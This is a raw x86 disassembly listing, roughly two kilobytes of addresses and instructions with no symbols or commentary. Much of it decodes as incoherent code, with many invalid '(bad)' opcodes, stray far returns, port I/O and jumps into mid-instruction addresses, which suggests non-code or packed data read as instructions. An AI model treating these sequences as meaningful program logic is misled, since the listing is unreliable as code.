  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
